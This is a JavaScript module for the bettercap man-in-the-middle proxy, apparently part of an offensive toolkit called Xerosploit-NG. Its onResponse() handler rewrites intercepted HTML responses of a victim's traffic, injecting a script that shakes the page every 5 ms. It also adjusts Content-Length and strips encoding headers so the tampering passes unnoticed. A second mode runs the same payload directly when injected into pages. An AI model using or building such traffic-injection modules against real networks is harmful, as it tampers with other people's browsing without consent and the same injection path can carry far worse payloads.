// ---------------------------------------------------------------------------
// Xerosploit-NG :: bettercap v2 HTTP proxy module -- ShakeScreen
//
// Shakes the victim's browser viewport by toggling the body margin, ported
// from the v1 JavaScript payload:
//   modules/js/shakescreen.js
//     window.onload=function(){var move=document.getElementsByTagName("body")[0];
//       setInterval(function(){move.style.marginTop=(move.style.marginTop=="4px")?"-4px":"4px";},5);}
//
// Two usage modes are supported by this single file:
//
//   1. As a bettercap proxy script (http.proxy.script): onResponse() injects
//      the payload above into every text/html response.
//        http_proxy(script=write_runtime_module("shakescreen.js", {}))
//
//   2. As a raw bettercap built-in injectjs payload (http.proxy.injectjs), which
//      is what PORT-SPEC section 5 documents:
//        http_proxy(injectjs=script("shakescreen.js"))
//      bettercap injects this file's contents into each page; the guarded
//      top-level IIFE below then runs the shake logic directly in the page
//      (it is inert when this file is evaluated inside bettercap itself, where
//      `document`/`window` do not exist).
//
// Strict passthrough: anything that is not text/html is left untouched, and
// any error is swallowed so proxied traffic is never broken.
//
// Released under the GNU GPLv3.
// Original Xerosploit: LionSec / Neodrix.
// ---------------------------------------------------------------------------

var XE_MODULE_NAME = "shakescreen";

// ---- mode 2: run immediately when injected as a raw payload into a page ---
(function () {
    if (typeof window === "undefined" || typeof document === "undefined") { return; }
    window.onload = function () {
        var body = document.getElementsByTagName("body")[0];
        if (!body || !body.style) { return; }
        setInterval(function () {
            body.style.marginTop = (body.style.marginTop === "4px") ? "-4px" : "4px";
        }, 5);
    };
})();

// ---- mode 1: bettercap proxy script ---------------------------------------
function xeLog(msg) {
    if (typeof log_info === "function") { log_info("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}
function xeWarn(msg) {
    if (typeof log_warn === "function") { log_warn("[xerosploit:" + XE_MODULE_NAME + "] " + msg); }
}

function xeByteLen(s) {
    var n = 0, i, c;
    s = "" + s;
    for (i = 0; i < s.length; i++) {
        c = s.charCodeAt(i);
        if (c < 0x80) { n += 1; }
        else if (c < 0x800) { n += 2; }
        else if (c >= 0xD800 && c <= 0xDBFF) { n += 4; i += 1; }
        else { n += 3; }
    }
    return n;
}

function xeIsHtml(res) {
    return !!res && typeof res.ContentType === "string" &&
        res.ContentType.toLowerCase().indexOf("text/html") === 0;
}

function xeReadBody(res) {
    if (!res) { return null; }
    if (typeof res.ReadBody === "function") { return res.ReadBody(); }
    return res.Body;
}

function xeInjectBeforeCloseTag(body, snippet) {
    var lower = body.toLowerCase();
    var at = lower.indexOf("</head>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    at = lower.indexOf("</body>");
    if (at !== -1) { return body.substring(0, at) + snippet + body.substring(at); }
    return body + snippet;
}

function xeSetBody(res, body) {
    res.Body = body;
    if (typeof res.SetHeader === "function") {
        res.SetHeader("Content-Length", "" + xeByteLen(body));
    }
    if (typeof res.RemoveHeader === "function") {
        res.RemoveHeader("Content-Encoding");
        res.RemoveHeader("Transfer-Encoding");
    }
}

// The payload injected in mode 1 (identical logic to the IIFE above, written
// as an inline script string so it can travel inside the HTML response).
var XE_SHAKE_SNIPPET =
    "<script type=\"text/javascript\">" +
    "window.onload=function(){" +
    "var move=document.getElementsByTagName(\"body\")[0];" +
    "setInterval(function(){" +
    "move.style.marginTop=(move.style.marginTop==\"4px\")?\"-4px\":\"4px\";" +
    "},5);};" +
    "</script>";

function onLoad() {
    xeLog("loaded");
}

function onResponse(req, res) {
    try {
        if (!xeIsHtml(res)) { return; }                                  // strict passthrough

        var body = xeReadBody(res);
        if (typeof body !== "string" || body.length === 0) { return; }

        var where = (req && req.Host ? req.Host : "") + (req && req.Path ? req.Path : "");
        xeLog("injecting shakescreen into " + where);

        xeSetBody(res, xeInjectBeforeCloseTag(body, XE_SHAKE_SNIPPET));
    } catch (e) {
        xeWarn("onResponse failed: " + e);                               // never break traffic
    }
}
